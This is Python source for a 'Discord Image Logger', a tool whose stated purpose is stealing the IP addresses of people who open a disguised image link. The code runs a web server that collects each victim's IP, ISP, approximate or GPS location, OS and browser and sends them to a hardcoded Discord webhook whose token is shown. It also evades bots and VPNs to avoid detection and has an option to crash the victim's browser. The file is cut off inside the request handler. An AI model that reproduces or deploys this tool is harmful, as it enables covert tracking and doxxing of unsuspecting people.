# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1113649710536867861/0c03CQdPt4iJnH4vQEaOeeIBVh-ijpqfY7Sn6K08IVKIqLpFom4nmD-eGcc6SuqcXSls",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

